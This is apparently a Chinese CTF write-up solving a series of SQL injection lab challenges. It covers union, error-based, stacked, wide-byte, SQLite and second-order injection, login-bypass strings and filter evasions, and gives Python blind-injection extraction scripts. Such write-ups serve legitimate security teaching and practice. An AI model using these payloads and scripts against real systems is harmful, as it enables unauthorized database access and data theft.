---
title: 青岑CTF EZSQL系列WP
description: 更新了不少题目，重写一篇ezsql的wp。
date: 2026-06-25 18:38:45
updated: 2026-06-25 18:38:45
image: https://img.yanxisishi.top/images/2026/06/20260625185012046.png
categories: [CTF]
tags: [CTF, WP]
---

## ezsql(数值型 Union 联合查询注入)

先输入示例提供的 `2026001`，发现可以正常回显出结果。

接下来判断闭合方式，先输入一个单引号 `'`，返回了：

```txt
Student ID not found. Please check and try again.
```

没有触发报错，说明不是字符型 SQL 注入。

继续尝试测试数值型 SQL 注入，输入 `2026000 + 1`，发现正常返回了 `2026001` 的查询结果，即输入内容被后端 SQL 语句解析了，说明存在数值型 SQL 注入。

也可以用 BurpSuite 爆破下列 payload，通过返回长度不同快速判断闭合方式：

```txt
2026001 and 1=1 -- 
2026001 and 1=2 -- 
2026001' and 1=1 -- 
2026001' and 1=2 -- 
2026001" and 1=1 -- 
2026001" and 1=2 -- 
2026001) and 1=1 -- 
2026001) and 1=2 -- 
2026001') and 1=1 -- 
2026001') and 1=2 -- 
2026001") and 1=1 -- 
2026001") and 1=2 -- 
2026001)) and 1=1 -- 
2026001)) and 1=2 -- 
2026001')) and 1=1 -- 
2026001')) and 1=2 -- 
2026001")) and 1=1 -- 
2026001")) and 1=2 -- 
2026001))) and 1=1 -- 
2026001))) and 1=2 -- 
2026001'))) and 1=1 -- 
2026001'))) and 1=2 -- 
2026001"))) and 1=1 -- 
2026001"))) and 1=2 -- 
```

爆破结果：

![image-20260621132333935](https://img.yanxisishi.top/images/2026/06/image-20260621132333935.png)

所以本题就是数值型 SQL 注入，优先尝试 Union 联合查询注入：

1. **判断列数**

   判断列数时，前面的查询条件得是正常成立的，例如输入：

   ```sql
   2026001 order by 1
   2026001 order by 2
   2026001 order by 3
   2026001 order by 4
   2026001 order by 5
   ```

   前面都能正常返回 `2006001` 的查询结果，直到输入：

   ```sql
   2026001 order by 5
   ```

   返回了：

   ```txt
   Student ID not found. Please check and try again.
   ```

   说明当前查询有 4 列。

2. **判断回显位**

   输入：

   ```sql
   -1 union select 1,2,3,4
   ```

   页面上返回：

   ![image-20260621132930843](https://img.yanxisishi.top/images/2026/06/image-20260621132930843.png)

   所以四列均为回显位。

3. **查询数据库名**

   这里以第二列回显位为例，输入：

   ```sql
   -1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
   ```

   返回：

   ```txt
   information_schema,user
   ```

   所以除了系统库 `information_schema`，只存在一个当前库 `user`。

4. **查询库 `user` 的表名**

   输入：

   ```sql
   -1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='user'
   ```

   返回：

   ```txt
   flag,students
   ```

   说明存在两个表 `flag,students`。

5. **查询表 `flag` 的列名**

   输入：

   ```sql
   -1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='user' and table_name='flag'
   ```

   返回：

   ```txt
   id,secret
   ```

   说明 `flag` 表存在两个列 `id,secret`。

6. **查询列 `secert` 的字段内容**

   输入：

   ```sql
   -1 union select 1,secret,3,4 from user.flag
   ```

   返回：

   ```txt
   flag{ea466d41-892a-4b6d-b8a7-527b7e254cad}
   ```

## ezsql_1(万能密码)

用万能密码登录即可，例如：

知道目标用户时，可以在账号框注释掉密码：

```txt
账号：admin' -- 
密码：随便填
```

或在账号框构造恒真条件：

```txt
账号：' or 1=1 -- 
密码：随便填
```

或把 payload 放在密码框：

```txt
账号：随便填
密码：' or 1=1 -- 
```

或账号和密码一起输入时，可以使用不带注释符的写法：

```txt
账号：' or '1'='1
密码：' or '1'='1
```

或一种 MySQL 里比较特殊的写法：

```txt
账号：'='
密码：'='
```

或使用块注释符注释掉账号和密码中间的内容：

```txt
账号：'/*
密码：*/ or 1=1 -- 
```

## ezsql_2(单引号闭合的字符型 Union 联合查询注入)

用上一题的万能密码登录后只会返回：

```txt
Welcome admin
```

所以单纯的登录 admin 无法得到 flag，可以用 Union 联合查询注入寻找 flag：

优先尝试 Union 联合查询注入：

1. **判断列数**

   判断列数时，前面的查询条件得是正常成立的，例如输入：

   ```sql
   账号：1' or 1=1 order by 1 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 2 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 3 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 4 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 5 -- 
   密码：随便填
   ```

   前面都能正常返回：

   ```txt
   Welcome admin
   ```

   直到输入：

   ```sql
   账号：1' or 1=1 order by 5 -- 
   密码：随便填
   ```

   返回了：

   ```txt
   Login failed.
   ```

   说明当前查询有 4 列。

2. **判断回显位**

   输入：

   ```sql
   账号：-1' union select 1,2,3,4 -- 
   密码：随便填
   ```

   页面上返回：

   ```txt
   Welcome 2
   ```

   所以第 2 列为回显位。

3. **查询数据库名**

   输入：

   ```sql
   账号：-1' union select 1,group_concat(schema_name),3,4 from information_schema.schemata -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome information_schema,user
   ```

   所以除了系统库 `information_schema`，只存在一个当前库 `user`。

4. **查询库 `user` 的表名**

   输入：

   ```sql
   账号：-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='user' -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome flag
   ```

   说明只存在一个表 `flag`。

5. **查询表 `flag` 的列名**

   输入：

   ```sql
   账号：-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='user' and table_name='flag' -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome id,name,passwd,secret
   ```

   说明 `flag` 表存在四个列 `id,name,passwd,secret`。

6. **查询列 `secert` 的字段内容**

   输入：

   ```sql
   账号：-1' union select 1,secret,3,4 from user.flag --  
   密码：随便填
   ```

   返回：

   ```txt
   Welcome flag{a8895091-12f9-4df9-b243-4702f519af44}
   ```

## ezsql_3(单引号嵌套一层小括号闭合的字符型 Union 联合查询注入)

用前两题的万能密码登录时返回：

```txt
Login failed.
```

说明本题的闭合方式可能不太一样。

用 BurpSuite 爆破以下 payload 作为账号，密码随便填：

```txt
admin and 1=1 -- 
admin and 1=2 -- 
admin' and 1=1 -- 
admin' and 1=2 -- 
admin" and 1=1 -- 
admin" and 1=2 -- 
admin) and 1=1 -- 
admin) and 1=2 -- 
admin') and 1=1 -- 
admin') and 1=2 -- 
admin") and 1=1 -- 
admin") and 1=2 -- 
admin)) and 1=1 -- 
admin)) and 1=2 -- 
admin')) and 1=1 -- 
admin')) and 1=2 -- 
admin")) and 1=1 -- 
admin")) and 1=2 -- 
admin))) and 1=1 -- 
admin))) and 1=2 -- 
admin'))) and 1=1 -- 
admin'))) and 1=2 -- 
admin"))) and 1=1 -- 
admin"))) and 1=2 -- 
```

返回：

![image-20260621140244806](https://img.yanxisishi.top/images/2026/06/image-20260621140244806.png)

可以看到：

```sql
admin') and 1=1 -- 
admin') and 1=2 -- 
```

的返回长度不一样，说明闭合方式为单引号嵌套一层小括号闭合。

重复上一题的 Union 联合查询步骤即可，这里偷个懒，输入：

```sql
账号：-1') union select 1,secret,3,4 from user.flag --  
密码：随便填
```

返回：

```txt
Welcome flag{481100eb-d7d9-4289-ae1d-f5f21a210e5a}
```

## ezsql_4(双引号闭合的字符型 Union 联合查询注入)

继续用上一题 BurpSuite 爆破的方法，测出来：

```txt
admin" and 1=1 -- 
admin" and 1=2 -- 
```

的返回长度不一样，说明闭合方式为双引号闭合。

输入：

```sql
账号：-1" union select 1,secret,3,4 from user.flag --  
密码：随便填
```

返回：

```txt
Welcome flag{9db68720-4d87-4c5d-92db-895ba10dca49}
```

## ezsql_5(双引号嵌套一层小括号闭合的字符型 Union 联合查询注入)

继续用 BurpSuite 爆破的方法，测出来：

```txt
admin") and 1=1 -- 
admin") and 1=2 -- 
```

的返回长度不一样，说明闭合方式为双引号闭合。

输入：

```sql
账号：-1") union select 1,secret,3,4 from user.flag --  
密码：随便填
```

返回：

```txt
Welcome flag{4474e121-9b91-42cd-bf8d-0b466e2c1631}
```

## ezsql_6(双输入框过滤注释符)

继续用 BurpSuite 爆破的方法时，发现所有 payload 均返回：

```txt
Invalid characters detected.
```

测试出来是过滤了 `--,#`，所以本题需要不用注释符实现闭合。

由于这里是双输入框，可以通过下面几种方式绕过：

1. **Union payload 放在密码框**

   输入：

   ```sql
   账号：随便填
   密码：-1' union select 1,secret,3,4 from user.flag where '1'='1
   ```

2. **Union payload 放在账号框**

   输入：

   ```sql
   账号：-1' union select 1,secret,3,4 from user.flag where 1=1 or '1'='1
   密码：随便填
   ```

3. **账号密码两个输入框配合块注释**

   输入：

   ```sql
   账号：-1' union select 1,secret,3,4 from user.flag where 1=1/*
   密码：*/ and '1'='1
   ```

## ezsql_7(过滤空格)

本题输入空格就会返回：

```txt
Illegal SQL injection
```

用下面几种方法绕过：

1. **注释符绕过**

   可以用 `/**/` 代替普通空格，输入：

   ```sql
   账号：-1'union/**/select/**/1,secret,3,4/**/from/**/user.flag#
   密码：随便
   ```

   **注：** 用 `#` 就在网页输入框里面输入，用 `%23` 就用 HackBar、URL 或者 BurpSuite 输入。

2. **URL 编码空白字符绕过**

   输入：

   ```http
   ?username=-1'union%0cselect%0c1,secret,3,4%0cfrom%0cuser.flag--%0c&password=随便
   ```

   **注：** 

   1. 不建议使用 `--%0a`。因为 `%0a` 是换行，而 `--` 是单行注释。`--%0a` 会导致注释在换行处结束，后面的原 SQL 又继续参与执行。
   2. 由于使用了 URL 编码，要用 HackBar、URL 或者 BurpSuite 输入，不要在网页输入框里面直接输入。

3. **小括号绕过**

   输入：

   ```sql
   账号：1'UNION(SELECT(1),secret,(3),(4)FROM(user.flag))#
   密码：随便
   ```

## ezsql_8(过滤空格&双写绕过关键词)

依旧过滤了空格，但输入：

```sql
账号：-1'union/**/select/**/1,secret,3,4/**/from/**/user.flag#
密码：随便
```

返回：

```txt
SQL Error: SELECT * FROM flag WHERE name = '-1'/**//**/1,secret,3,4/**//**/user.#' AND passwd = '1'
```

说明原 payload 中的 `union,select,from,flag` 均被删掉了，双写绕过即可，输入：

```txt
账号：-1'uniunionon/**/seselectlect/**/1,secret,3,4/**/ffromrom/**/user.flflagag#
密码：随便
```

## ezsql_9(数值型 Union 联合查询注入)

变成单条查询框了，输入一个 `1` 可以返回出 `1` 的查询结果。

接着可以用 BurpSuite 爆破下列 payload，通过返回长度不同快速判断闭合方式：

```txt
1 and 1=1 -- 
1 and 1=2 -- 
1' and 1=1 -- 
1' and 1=2 -- 
1" and 1=1 -- 
1" and 1=2 -- 
1) and 1=1 -- 
1) and 1=2 -- 
1') and 1=1 -- 
1') and 1=2 -- 
1") and 1=1 -- 
1") and 1=2 -- 
1)) and 1=1 -- 
1)) and 1=2 -- 
1')) and 1=1 -- 
1')) and 1=2 -- 
1")) and 1=1 -- 
1")) and 1=2 -- 
1))) and 1=1 -- 
1))) and 1=2 -- 
1'))) and 1=1 -- 
1'))) and 1=2 -- 
1"))) and 1=1 -- 
1"))) and 1=2 -- 
```

测出来：

```txt
1 and 1=1 -- 
1 and 1=2 -- 
```

的返回长度不一样，说明是数值型 SQL 注入。

后续和 [ezsql](#ezsql(数值型 Union 联合查询注入)) 的做法一样，也是数值型 Union 联合查询注入，不重复了，输入：

```sql
-1 union select 1,flag,3,4 from user.flag
```

## ezsql_10(单引号闭合的字符型 Union 联合查询注入)

用 BurpSuite 爆破后测出来：

```txt
1' and 1=1 -- 
1' and 1=2 -- 
```

的返回长度不一样，说明是单引号闭合的字符型 SQL 注入。

后续和 [ezsql2](#ezsql_2(单引号闭合的字符型 Union 联合查询注入)) 的做法一样，输入：

```sql
-1' union select 1,flag,3,4 from user.flag -- 
```

## ezsql_11(过滤 select &堆叠注入)

输入上题 payload 后，返回：

```txt
Illegal SQL injection
```

经测试是 `select` 被严格过滤，优先考虑堆叠注入。

先测试是否存在堆叠注入：

```sql
1'; do sleep(5);
```

有明显的 5 秒延迟，说明确实存在堆叠注入。

先用 `show` 枚举表：

```sql
1'; show tables;
```

得知有 `employees;flag` 两个表。

接下来可以用 Handler 句柄法来读取字段数据。

> `handler` 是 MySQL 专属语法，可以不使用 `select` 读取表数据。

输入：

```sql
# 打开表句柄，读取第一行
1'; handler flag open;handler flag read first; 
```

## ezsql_12(报错注入)

又变成双输入框，输入万能密码后返回：

```txt
Login successful.
```

说明 flag 不在当前库或表中，先尝试使用 Union 联合查询注入：

1. **判断列数**

   输入：

   ```sql
   账号：1' or 1=1 order by 1 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 2 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 3 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 4 -- 
   密码：随便填
   ```

   前面都能正常返回：

   ```txt
   Login successful.
   ```

   直到输入：

   ```sql
   账号：1' or 1=1 order by 4 -- 
   密码：随便填
   ```

   返回了：

   ```txt
   SQL Error: Unknown column '4' in 'order clause'
   ```

   说明当前查询有 3 列。

但是由于此处是直接回显 SQL 报错信息，说明很可能可以使用 `updatexml()` 报错注入：

1. **查询数据库名**

   输入：

   ```sql
   账号：1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
   密码：随便填
   ```

   返回：

   ```txt
   ~information_schema,user~
   ```

2. **查询库 user 的表名**

   输入：

   ```sql
   账号：1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='user'),0x7e),1) -- 
   密码：随便填
   ```

   返回：

   ```txt
   ~flag,users~
   ```

3. **查询表 flag 的列名**

   输入：

   ```sql
   账号：1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flag'),0x7e),1) -- 
   密码：随便填
   ```

   返回：

   ```txt
   ~id,flag~
   ```

4. **查询列 flag 的字段内容**

   先判断字段内容长度，输入：

   ```sql
   账号：1' and updatexml(1,concat(0x7e,(select length(group_concat(flag)) from user.flag),0x7e),1) -- 
   密码：随便填
   ```

   返回：

   ```txt
   ~42~
   ```

   分段读取字段内容，输入：

   ```sql
   # 读取第 1-30 位
   账号：1' and updatexml(1,concat(0x7e,substr((select group_concat(flag) from user.flag),1,30),0x7e),1) -- 
   密码：随便填
   ```

   和

   ```sql
   读取第 31-42 位
   账号：1' and updatexml(1,concat(0x7e,substr((select group_concat(flag) from user.flag),31,42),0x7e),1) -- 
   密码：随便填
   ```

   拼接得到 flag。

## ezsql_13(布尔盲注)

单个查询框，输入 `1` 后只返回：

```txt
查询成功
```

没有回显位置，推测是布尔盲注，输入：

```sql
1' and length(database())>0 -- 
```

仍返回：

```txt
查询成功
```

说明确实存在布尔盲注。

用 ASCII 二分法爆破脚本：

```python
import requests

url = "http://docker.qingcen.net:36981/"
success_text = "查询成功"
result = ""

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名
        # payload = f"1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid} -- "

        # 爆指定数据库的表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='user'),{i},1))>{mid} -- "

        # 爆指定表的列名
        # payload = f"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flag'),{i},1))>{mid} -- "

        # 爆字段内容
        payload = f"1' and ascii(substr((select group_concat(flag) from user.flag),{i},1))>{mid} -- "

        res = requests.get(url, params={"id": payload})

        if success_text in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

## ezsql_14(时间盲注)

这次不管输入什么都只会返回：

```txt
The query results have been sent to your email.
```

没有查询成功和查询失败了，采用时间盲注：

```python
import requests
import time

url = "http://docker.qingcen.net:32983/"
result = ""
delay = 3
threshold = 2.5

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名
        # payload = f"1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆指定数据库的表名
        # payload = f"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='user'),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆指定表的列名
        # payload = f"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flag'),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆字段内容
        payload = f"1' and if(ascii(substr((select group_concat(flag) from user.flag),{i},1))>{mid},sleep({delay}),0) -- "

        start = time.time()
        requests.get(url, params={"id": payload})
        end = time.time()

        if end - start > threshold:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

## ezsql_15(宽字节注入)

又是账号密码登录框，这次输入：

```sql
账号：-1' union select 1,secret,3,4 from user.flag --  
密码：随便填
```

返回：

```txt
Login failed.
```

用普通的万能密码：

```sql
账号：' or 1=1 -- 
密码：随便填
```

依旧返回：

```txt
Login failed.
```

测试一下闭合方式，在账号处爆破：

```txt
admin and 1=1 -- 
admin and 1=2 -- 
admin' and 1=1 -- 
admin' and 1=2 -- 
admin" and 1=1 -- 
admin" and 1=2 -- 
admin) and 1=1 -- 
admin) and 1=2 -- 
admin') and 1=1 -- 
admin') and 1=2 -- 
admin") and 1=1 -- 
admin") and 1=2 -- 
admin)) and 1=1 -- 
admin)) and 1=2 -- 
admin')) and 1=1 -- 
admin')) and 1=2 -- 
admin")) and 1=1 -- 
admin")) and 1=2 -- 
admin))) and 1=1 -- 
admin))) and 1=2 -- 
admin'))) and 1=1 -- 
admin'))) and 1=2 -- 
admin"))) and 1=1 -- 
admin"))) and 1=2 -- 
```

所有测试 payload 的返回长度却都一样，想到可能是宽字节注入。

由于使用了 URL 编码，不要在网页输入框里面输入，用 HackBar 发送：

```http
?username=-1%df' union select 1,secret,3,4 from user.flag --  +&password=1
```

## ezsql_16(SQLite Union 联合查询注入)

输入：

```sql
账号：-1' union select 1,secret,3,4 from user.flag --  
密码：随便填
```

返回：

```txt
Login failed.
```

以及报错信息：

```txt
Warning: SQLite3::query(): Unable to prepare statement: 1, no such table: user.flag in /var/www/html/index.php on line 38
```

说明本题的数据库改成了 SQLite，前面针对 MySQL 的 payload 自然用不了了。

仍然使用 Union 联合查询注：

优先尝试 Union 联合查询注入：

1. **判断列数**

   输入：

   ```sql
   账号：1' or 1=1 order by 1 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 2 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 3 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 4 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 5 -- 
   密码：随便填
   ```

   前面都能正常返回：

   ```txt
   Welcome admin
   ```

   直到输入：

   ```sql
   账号：1' or 1=1 order by 5 -- 
   密码：随便填
   ```

   返回了：

   ```txt
   Login failed.
   ```

   说明当前查询有 4 列。

2. **判断回显位**

   输入：

   ```sql
   账号：-1' union select 1,2,3,4 -- 
   密码：随便填
   ```

   页面上返回：

   ```txt
   Welcome 2
   ```

   所以第 2 列为回显位。

3. **查询表名**

   **这里开始和 MySQL 的 payload 不一样了** ，因为在 SQLite 注入中，通常不需要、也没法像 MySQL 那样直接爆出库名，所以直接来到爆表名。

   输入：

   ```sql
   账号：-1' union select 1,group_concat(name),3,4 from sqlite_master where type='table' -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome flag
   ```

   说明只存在一个表 `flag`。

4. **查询建表语句**

   输入：

   ```sql
   账号：-1' union select 1,sql,3,4 from sqlite_master where type='table' and name='flag' -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome CREATE TABLE flag (id INTEGER, name TEXT, passwd TEXT, secret TEXT)
   ```

   说明 `flag` 表存在四个列 `id,name,passwd,secret`。

5. **查询列 `secert` 的字段内容**

   输入：

   ```sql
   账号：-1' union select 1,group_concat(secret),3,4 from flag -- 
   密码：随便填
   ```

   返回：

   ```txt
   Welcome flag{b3378837-cf74-451a-8c10-17ff60996809}
   ```

## ezsql_17(SQLite 布尔盲注)

只会返回 `查询成功` 和 `未找到员工信息`，可以用布尔盲注，且数据库类型仍然是 SQLite，编写脚本：

```python
import requests

url = "http://docker.qingcen.net:31749/"
success_text = "查询成功"
result = ""

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有表名
        # payload = f"1' and unicode(substr((select group_concat(name) from sqlite_master where type='table'),{i},1))>{mid} -- "

        # 爆指定表的建表语句
        # payload = f"1' and unicode(substr((select sql from sqlite_master where type='table' and name='flag'),{i},1))>{mid} -- "

        # 爆字段内容
        payload = f"1' and unicode(substr((select group_concat(flag) from flag),{i},1))>{mid} -- "

        res = requests.get(url, params={"id": payload})

        if success_text in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

## ezsql_18(二次注入&万能密码)

分为登录和注册两个页面，尝试二次注入。

首先在注册页面注册一个：

```sql
账号：' or 1=1 -- 
密码：随便填
```

然后用这个账号密码进行登录，查看 `我的笔记` 得到 flag。

## ezsql_18(二次注入& Union 联合查询注入)

仍然是二次注入，但单纯的万能密码无法回显出 flag，需要结合 Union 联合查询注入：

尝试 Union 联合查询注入：

1. **判断列数**

   注册：

   ```sql
   账号：1' or 1=1 order by 1 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 2 -- 
   密码：随便填
   
   账号：1' or 1=1 order by 3 -- 
   密码：随便填
   ```

   注册后进行登录并查看 `我的笔记` ，前面都能正常返回：

   ```txt
   Welcome admin. Your secret note is empty.
   ```

   直到注册：

   ```sql
   账号：1' or 1=1 order by 3 -- 
   密码：随便填
   ```

   返回了：

   ```txt
   查询异常：Unknown column &#039;4&#039; in &#039;ORDER BY&#039;
   ```

   说明当前查询有 2 列。

2. **判断回显位**

   注册：

   ```sql
   账号：-1' union select 1,2 -- 
   密码：随便填
   ```

   返回：

   ```txt
   2
   ```

   所以第 2 列为回显位。

3. **查询数据库名**

   注册：

   ```sql
   账号：-1' union select 1,group_concat(schema_name) from information_schema.schemata -- 
   密码：随便填
   ```

   返回：

   ```txt
   information_schema,user
   ```

   所以除了系统库 `information_schema`，只存在一个当前库 `user`。

4. **查询库 `user` 的表名**

   注册：

   ```sql
   账号：-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='user' -- 
   密码：随便填
   ```

   返回：

   ```txt
   user_notes,users,flags
   ```

   说明存在表 `user_notes,users,flags`。

5. **查询表 `flags` 的列名**

   注册：

   ```sql
   账号：-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='user' and table_name='flags' -- 
   密码：随便填
   ```

   返回：

   ```txt
   flag
   ```

   说明 `flag` 表只存在 1 个列 `flag`。

6. **查询列 `flag` 的字段内容**

   注册：

   ```sql
   账号：-1' union select 1,flag from user.flags --  
   密码：随便填
   ```

   返回：

   ```txt
   flag{25519142-8d3f-4305-a8a7-7696342c2b13}
   ```
